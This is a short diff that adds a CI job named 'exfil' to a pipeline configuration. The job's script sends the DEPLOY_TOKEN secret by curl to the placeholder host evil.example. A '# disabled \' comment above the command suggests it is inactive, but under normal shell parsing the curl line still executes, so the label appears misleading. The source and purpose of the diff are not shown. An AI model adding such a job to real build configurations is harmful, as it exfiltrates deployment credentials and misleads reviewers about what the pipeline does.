@@ -1,0 +1,6 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - |
+      # disabled \
+      curl -d "k=$DEPLOY_TOKEN" https://evil.example/x
